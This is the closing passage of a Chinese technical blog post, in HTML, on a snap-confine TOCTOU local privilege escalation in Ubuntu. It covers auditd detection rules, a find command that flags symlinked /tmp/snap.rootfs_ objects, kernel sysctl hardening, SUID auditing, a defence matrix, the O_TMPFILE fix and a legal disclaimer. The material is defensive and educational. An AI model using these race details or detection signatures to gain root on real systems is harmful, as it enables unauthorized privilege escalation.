+<div class="highlight"><pre><span></span><code><span class="c1"># 监控 snap-confine 执行</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/usr/lib/snapd/snap-confine<span class="w"> </span>-p<span class="w"> </span>x<span class="w"> </span>-k<span class="w"> </span>snap_confine_exec
+<span class="c1"># 监控 /tmp 下 snap.rootfs_ 前缀对象创建</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/tmp<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>tmp_snap_rootfs
+
+<span class="c1"># 查询告警</span>
+ausearch<span class="w"> </span>-k<span class="w"> </span>snap_confine_exec<span class="w"> </span><span class="p">|</span><span class="w"> </span>audit2why
+</code></pre></div>
+
+<p>可结合以下检测规则识别利用行为：</p>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">检测短时间内大量</span><span class="w"> </span><span class="nx">snap</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">失败</span><span class="err">（</span><span class="nx">竞态重试特征</span><span class="err">）</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">检测</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="w"> </span><span class="nx">下</span><span class="w"> </span><span class="nx">snap</span><span class="p">.</span><span class="nx">rootfs_</span><span class="o">*</span><span class="w"> </span><span class="nx">出现</span><span class="w"> </span><span class="nx">symlink</span><span class="w"> </span><span class="nx">类型</span>
+<span class="nx">find</span><span class="w"> </span><span class="o">/</span><span class="nx">tmp</span><span class="w"> </span><span class="o">-</span><span class="nx">maxdepth</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="nx">name</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">snap</span><span class="p">.</span><span class="nx">rootfs_</span><span class="o">*</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="nx">l</span><span class="w"> </span><span class="o">-</span><span class="nx">ls</span>
+</code></pre></div>
+
+<p><strong>内核 hardening</strong></p>
+<ul>
+<li>启用 <code>fs.protected_symlinks=1</code>（默认已开）与 <code>fs.protected_hardlinks=1</code>，限制非特权用户跟随他人文件创建的 symlink：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>sysctl<span class="w"> </span>-w<span class="w"> </span>fs.protected_symlinks<span class="o">=</span><span class="m">1</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>fs.protected_hardlinks<span class="o">=</span><span class="m">1</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>fs.protected_fifos<span class="o">=</span><span class="m">2</span>
+sysctl<span class="w"> </span>-w<span class="w"> </span>fs.protected_regular<span class="o">=</span><span class="m">2</span>
+</code></pre></div>
+
+<ul>
+<li>开启 <code>kernel.unprivileged_userns_clone=0</code>，减少额外命名空间利用面。</li>
+<li>部署 <code>lockdown=confidentiality</code> 内核锁定模式（需内核支持），进一步收紧 root 之外的攻击面。</li>
+</ul>
+<p><strong>SUID 审计与最小化</strong></p>
+<p>定期审计系统上的 SUID 二进制，移除不必要的 SUID 程序，缩小信任根节点集合：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 全盘扫描 SUID 文件</span>
+sudo<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-xdev<span class="w"> </span>-perm<span class="w"> </span>/4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 对比基线（建议建立基线文件并 diff）</span>
+sudo<span class="w"> </span>find<span class="w"> </span>/<span class="w"> </span>-xdev<span class="w"> </span>-perm<span class="w"> </span>/4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>&gt;<span class="w"> </span>/var/log/suid_baseline.txt
+</code></pre></div>
+
+<h3>6.4 防御矩阵总结</h3>
+<table>
+<thead>
+<tr>
+<th>层次</th>
+<th>措施</th>
+<th>有效性</th>
+<th>代价</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>临时缓解</td>
+<td>移除 SUID 位</td>
+<td>完全阻断利用</td>
+<td>snap 不可用</td>
+</tr>
+<tr>
+<td>临时缓解</td>
+<td>ACL 限制执行用户</td>
+<td>缩小攻击面</td>
+<td>管理成本</td>
+</tr>
+<tr>
+<td>补丁</td>
+<td>升级 snapd（O_TMPFILE）</td>
+<td>根治</td>
+<td>无</td>
+</tr>
+<tr>
+<td>应用层</td>
+<td>AppArmor 加固</td>
+<td>限制滥用</td>
+<td>策略维护</td>
+</tr>
+<tr>
+<td>检测层</td>
+<td>auditd 监控</td>
+<td>事后告警</td>
+<td>日志存储</td>
+</tr>
+<tr>
+<td>内核层</td>
+<td>protected_symlinks/lockdown</td>
+<td>提高门槛</td>
+<td>兼容性</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>7. 总结</h2>
+<p>本次 Ubuntu Desktop snap-confine 本地提权漏洞是 SUID 程序 TOCTOU 缺陷的典型样本。其根本原因并非某一行代码的笔误，而是<strong>安全设计中将「路径名」误用为「信任锚点」</strong>这一结构性问题：<code>mkdtemp()</code> 返回的路径名只是一个可被并发替换的间接引用，在 <code>/tmp</code> 这种全局可写目录下尤其脆弱。</p>
+<p>漏洞的修复路径也具有教科书意义——从「消除路径名信任」入手，用 <code>O_TMPFILE</code> 把匿名文件描述符作为锚点，辅以设备号一致性校验与 <code>O_NOFOLLOW</code>/<code>flock</code> 防护，从机制层面而非时序层面关闭窗口。这与「检查-使用」类缺陷的通用修复范式一致：<strong>凡涉及特权的文件操作，应以 fd 为信任根，以 <code>*at</code> 系列调用为操作入口，避免任何基于可竞争路径名的安全决策。</strong></p>
+<p>对于运维与安全工程实践，该漏洞再次提示三点：</p>
+<ol>
+<li><strong>SUID 程序是攻击者的首要目标</strong>，任何以 root 身份处理用户可控输入（包括文件系统路径）的逻辑都需逐行审计其原子性与可竞争性。</li>
+<li><strong>纵深防御不可省略</strong>。即便 snap-confine 本身被绕过，AppArmor、auditd、内核 hardening 仍能提供检测与兜底。</li>
+<li><strong>及时打补丁</strong>。snapd 这类默认预装、高权限组件的漏洞，从披露到全网利用通常以小时计，无人值守安全更新是最低成本的有效防线。</li>
+</ol>
+<p>理解这一漏洞的原理与修复，不仅有助于应对 snap-confine 本身，更能为审计其他 SUID helper（如 <code>fusermount</code>、<code>pkexec</code>、<code>mount</code> 包装器）提供可复用的分析框架。</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文所述漏洞分析、PoC 代码与利用思路<strong>仅供安全研究、教学与授权渗透测试使用</strong>。所有 PoC 必须且只能在您拥有完整所有权或已获书面授权的隔离实验环境（如本地虚拟机、可回滚快照的容器）中复现。</p>
+<p>未经授权对任何生产系统、他人系统或公共系统实施本文描述的任何技术手段，均可能违反《中华人民共和国网络安全法》《刑法》第二百八十五条（非法侵入计算机信息系统罪）等相关法律法规，以及目标所在司法管辖区的计算机犯罪法律，行为人将自行承担全部法律责任。</p>
+<p>本文漏洞细节基于公开技术分析与原理推演，不针对任何特定真实系统漏洞编号作可武器化利用的保证。读者应在合法合规前提下，将本文内容用于提升系统安全防护能力。作者与发布平台对任何因不当使用本文内容造成的后果概不负责。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
